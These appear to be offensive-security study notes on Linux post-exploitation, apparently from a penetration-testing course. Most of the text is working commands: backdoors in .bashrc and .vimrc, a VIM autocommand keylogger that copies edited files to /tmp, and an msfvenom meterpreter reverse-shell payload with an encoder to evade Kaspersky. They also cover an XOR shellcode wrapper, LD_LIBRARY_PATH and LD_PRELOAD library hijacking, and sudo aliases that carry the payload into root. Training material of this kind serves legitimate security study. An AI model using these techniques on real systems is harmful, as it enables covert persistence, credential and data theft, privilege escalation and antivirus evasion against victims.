## User Configuration Files

In Linux systems, applications frequently store user-specific configuration files and subdirectories
within a user’s home directory. These configuration files control how applications behave for a specific user and are typically only writable by the users or root.
If we compromise a system under a given user, we can modify those files and change how applications behave for them.

Two common examples are **.bash_profile** and **.bashrc**.
- **.bash_profile** is executed when logging in to the system initially(login to machine, or ssh)
- **.bashrc** is executed when a new terminal window is opened from an existing login session
- **can be useful when trying to maintain persistence or escalate privileges**

Example, append touch command to .bashrc, and spawn a new shell will trigger the command execution
```
linux@linuxvictim:~$ echo "touch /tmp/bashtest.txt" >> ~/.bashrc

linux@linuxvictim:~$ /bin/bash
linux@linuxvictim:~$ ls -al /tmp/bashtest.txt
-rw-rw-r-- 1 linux linux 0 Aug 26 15:20 /tmp/bashtest.txt
```
## Attcking with VIM text editor
#### VIM config file backdoor

On many Linux systems, user-specific VIM configuration settings are located in a user’s home directory in the .vimrc file. The commands specified in the .vimrc file are executed when VIM is launched. we can leverage the VIM plugin directory. As long as the files have a .vim extension, all VIM config files located in the user’s **~/.vim/plugin** directory will be loaded
when VIM is run.

We add one line in the user’s **.vimrc** file to the following, this command will mutes debug output and execute /.vimrunscript script.
```
:silent !source ~/.vimrunscript
```

On a Debian or similar system, if the user runs VIM via sudo, our script being sourced does not persist the user’s shell environment
information when moving to a sudo context. We can add an alias to the user’s .bashrc file. source command makes alias changes to go into effect right away.

```
alias sudo="sudo -E"

linux@linuxvictim:~$ source ~/.bashrc
```
#### VIM config keylogger
We can use **:autocmd** in a VIM configuration file or in the editor to set actions for a collection of predefined events. All detials commands can be found at [Vim documentation: autocmd](http://vimdoc.sourceforge.net/htmldoc/autocmd.html)

Now we can set up an autocommand that fires on the BufWritePost action and then writes the content of the file to a log file we specify. We will put our command in
```/home/linux/.vim/plugin/settings.vim```

```
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
```
**BufWritePost** us the event, meaning that after a buffer is written to a file, we will perform our action. “*” specifies this action will be performed for all files being edited. **:w!** save the buffer contents, **!** is a force modifier, it will overwrite an existing file.

VIM supports the use of basic if statements in its configuration scripts
```
:if <some condition>
:<some command>
:else
:<some alternative command>
:endif
```

below example will check if user os running as root

```
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
:endif
```

## Bypass AV with encoder and C code wrapper

First, let's test our linux scan with [eicar](https://www.eicar.org/?page_id=3950) project. ```sudo kesl-control --scan-file ./eicar.txt```. The the eicar.txt should be removed. Otherwise, the scanner is not working. We can also check the Kaspersky’s event log for detected events ```sudo kesl-control -E --query | grep DetectName```.

#### Bypass with x64/zutto_dekiru encoder
this method bypass Kaspersky scanner, but not all scanners at [Antiscan.me](https://antiscan.me/)

```
sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LPORT=443 LHOST=10.10.10.6 -e x64/zutto_dekiru -f elf -o /tmp/met64zutto.elf
```

#### Bypass with C code wrapper and xor encrytion.

We can use the msfvenom to create c shell code, xor the shell code, wrap the xored shell code in c file, add decrypt function, and compile c file into exe.
- [encoder.c](/08PlayingWithLinux/encoder.c) encrypt shell code and print out encrypted payload
- [CWrapper.c](/08PlayingWithLinux/CWrapper.c) decrypt shell code and run

Compile encoder and run encoder
```
kali@kali:~$ gcc -o encoder.out encoder.c

kali@kali:~$ ./encoder.out
\x20\x73\x12\x45\x4F\x02\xCF\x8A\
```

Compile shellcode wrapper, don't forget to compile the c code in the same architecture as target's
```
kali@kali:~$ gcc -o CWrapper.out CWrapper.c -z execstack
```

## Shared Libraries attack in Linux

Like dll in windows, shared libraries allow code to be defined separately from specific applications and reused. 
When applications run on linux, they check for required libraries in a number of locations in specific order, once they find a copy of the library, they will stop searching and load the module. The directory search order is:
- 1.application’s RPATH5 value
- 2.LD_LIBRARY_PATH environment variable
- 3.the application’s RUNPATH
- 4./etc/ld.so.conf.
- 5.System library directories: /lib, /lib64, /usr/lib, /usr/lib64, /usr/local/lib, /usr/local/lib64, and
potentially others.

#### Shared Library Hijacking via LD_LIBRARY_PATH
when an application runs, it checks for its libraries in an ordered set of locations. After checking its internal RPATH values for hard coded paths, it then checks for an
environment variable called LD_LIBRARY_PATH. We will overwrite LD_LIBRARY_PATH.

Let's walk though an example with up command in linux.
- 1.Let's create a c file [lib.c](/08PlayingWithLinux/lib.c), then compile it to lib resource
- 2.We can compile the share libary with the follwoing command, -Wall->give verbose warnings when compiling, -fPIC ->use position independent code, since shared libraries are loaded in unpredictable memeory locations. -shared -> create a shared library from object file

```
offsec@linuxvictim:~/ldlib$ gcc -Wall -fPIC -c -o lib.o lib.c
offsec@linuxvictim:~/ldlib$ gcc -shared -o lib.so lib.o
```
- 3.We use **ldd** command against top program to understand which libraries are being loaded when top executes.
```
offsec@linuxvictim:~$ ldd /usr/bin/top
linux-vdso.so.1 (0x00007ffd135c5000)
libprocps.so.6 => /lib/x86_64-linux-gnu/libprocps.so.6 (0x00007ff5ab935000)
libtinfo.so.5 => /lib/x86_64-linux-gnu/libtinfo.so.5 (0x00007ff5ab70b000)
libgpg-error.so.0 => /lib/x86_64-linux-gnu/libgpg-error.so.0 (0x00007ff5aa0f8000)
```
Okay,libgpg-error.so.0 looks intersting, This is likely
to be loaded by the application but not likely to be called unless the program encounters an error therefore this shouldn’t prevent normal use of the application. Let’s try to hijack.

- 4.We rename .so file to match the one we’re hijacking and set the environment variable for LD_LIBRARY_PATH
```
offsec@linuxvictim:~/ldlib$ export LD_LIBRARY_PATH=/home/offsec/ldlib/
offsec@linuxvictim:~/ldlib$ cp lib.so libgpg-error.so.
```
- 5.Execute the top program and we identify symbol gpgrt_lock_lock version GPG_ERROR_1.0 not defined.
```
offsec@linuxvictim:~/ldlib$ top
top: /home/offsec/ldlib/libgpg-error.so.0: no version information available (required
by /lib/x86_64-linux-gnu/libgcrypt.so.20)
top: relocation error: /lib/x86_64-linux-gnu/libgcrypt.so.20: symbol gpgrt_lock_lock
version GPG_ERROR_1.0 not defined in file libgpg-error.so.0 with link time reference
```
- 6.This means that certain variables or functions that the program expects to find when loading the original library have not been defined in our malicious library. we can simply define some variables with the same names that it expects and top should run. We will examine the libgpg-error.so.0  to detemine what symbols it contains using the **readelf** The error message tell use to look for **GPG_ERROR_1.0.**

-s flag for symblos, --wide flag to force the untruncated names of the symbols, awk to pring 8th filed and append int in front of the resutlt, sed command to replace version
information with a semicolon in order to finalize the variable definitions
```
offsec@linuxvictim:~/ldlib$ readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
int gpgrt_onclose;
int _gpgrt_putc_overflow;
int gpgrt_feof_unlocked;
...
int gpgrt_fflush;
int gpgrt_poll;
```
- 7.Modify our [lib.c](/08PlayingWithLinux/lib2.c) code to include a list of variable definitions, recompile and run.
```
offsec@linuxvictim:~/ldlib$ top
top: /home/offsec/ldlib/libgpg-error.so.0: no version information available (required
by /lib/x86_64-linux-gnu/libgcrypt.so.20)
DLL HIJACKING IN PROGRESS
```
- 8.We got the working injection message, however, there is a error mesaage about shared library's version information. Not all supporting libraries require version information, so this does not always occur. We can slove this with [map file](https://www.gnu.org/software/gnulib/manual/html_node/LD-Version-Scripts.html) that identifies particular symbols as being associated with a given version of the library.

```
offsec@linuxvictim:~/ldlib$ readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0
| grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'
gpgrt_onclose;
_gpgrt_putc_overflow;
gpgrt_feof_unlocked;
gpgrt_vbsprintf;
```

Copy the output symbols names to a anything.map file. see example format below

```
GPG_ERROR_1.0 {
gpgrt_onclose;
_gpgrt_putc_overflow;
...
gpgrt_fflush;
gpgrt_poll;
};
```
- 9.Recompile the code with map file and set LD_LIBRARY_PATH environment variable
```
offsec@linuxvictim:~/ldlib$ gcc -Wall -fPIC -c -o lib.o lib.c
offsec@linuxvictim:~/ldlib$ gcc -shared -Wl,--version-script gpg.map -o libgpgerror.so.0 lib.o
offsec@linuxvictim:~/ldlib$ export LD_LIBRARY_PATH=/home/offsec/ldlib/
```
- 10.Hint, if you did't get a root output file,it is because a user’s environment variables aren’t normally passed to a sudo context. To get around this, we created an alias for sudo in the user’s .bashrc file
```
alias sudo="sudo LD_LIBRARY_PATH=/home/offsec/ldlib"
source ~/.bashrc
```

#### Exploitation via LD_PRELOAD
LD_PRELOAD is an environment variable. When defined, it forces dynamic linking loader to preload a particular shared library before any others. This means that methods we define in a library loaded by LD_PRELOAD will override methods loaded later on. For this attack vector, we first need to find an application that the victim is likely to frequently use. One potential option is the cp command.

- 1.We can run ltrace on the cp command to get a list of library function calls it uses during normal operation. geteuid function is a good candidate
because it seems to only be called once during the application run, which limits how frequently our code will be executed.
our code will be executed.
 
```
offsec@linuxvictim:~$ ltrace cp
strrchr("cp", '/') = nil
...
geteuid() = 1000
getenv("POSIXLY_CORRECT") = nil
```

- 2.Write[preloadshellcode.c]() to define custom geteuid and inject our shell code, compile c code. Set the LD_PRELOAD env. 

```
offsec@linuxvictim:~$ gcc -Wall -fPIC -z execstack -c -o evil_geteuid.o preloadshellcode.c
offsec@linuxvictim:~$ gcc -shared -o evil_geteuid.so evil_geteuid.o -ldl
offsec@linuxvictim:~$ export LD_PRELOAD=/home/offsec/evil_geteuid.so
```

Create sudo LD_PRELOAD alias in .bashrc.
```
alias sudo="sudo LD_PRELOAD=/home/offsec/evil_geteuid.so"
```
